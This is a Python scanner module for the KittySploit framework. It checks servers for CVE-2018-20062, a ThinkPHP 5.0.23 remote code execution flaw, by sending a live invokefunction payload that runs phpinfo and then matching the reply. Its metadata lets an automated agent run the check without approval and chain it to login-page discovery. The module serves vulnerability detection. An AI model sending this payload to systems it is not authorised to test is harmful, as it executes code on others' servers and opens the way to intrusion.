#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered in NoneCms V1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ThinkPHP 5.0.23 - Remote Code Execution Detection',
        'description': 'An issue was discovered in NoneCms V1.3. thinkphp/library/think/App.php allows remote attackers to execute arbitrary PHP code via crafted use of the filter parameter, as demonstrated by the s=index/\\think\\Request/input&filter=phpinfo&data=1 query string.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'kev', 'thinkphp', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/yilin1203/CVE-2018-20062/blob/main/CVE-2018-20062.py',
            'https://github.com/yilin1203/CVE-2018-20062',
            'https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce',
        ],
        'cve': 'CVE-2018-20062',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('PHP Extension', 'PHP Version', 'ThinkPHP',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="ThinkPHP 5.0.23 - Remote Code Execution detected",
                path='/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
            )
            return True
        return False

